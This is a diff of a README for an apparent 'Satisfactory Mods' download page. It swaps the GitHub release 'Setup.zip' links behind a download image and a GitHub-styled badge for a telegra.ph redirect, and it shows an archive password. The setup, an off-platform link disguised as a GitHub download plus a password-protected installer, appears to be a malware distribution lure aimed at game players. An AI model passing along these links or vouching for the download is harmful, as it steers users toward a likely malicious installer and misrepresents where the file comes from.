@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)](https://github.com/Hurricaneoverserver/Satisfactory-Mods/releases/download/v1.0/Setup.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Satisfactory Mods](https://img.shields.io/badge/Download%20Satisfactory%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Hurricaneoverserver/Satisfactory-Mods/releases/download/v1.0/Setup.zip)
+[![Satisfactory Mods](https://img.shields.io/badge/Download%20Satisfactory%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
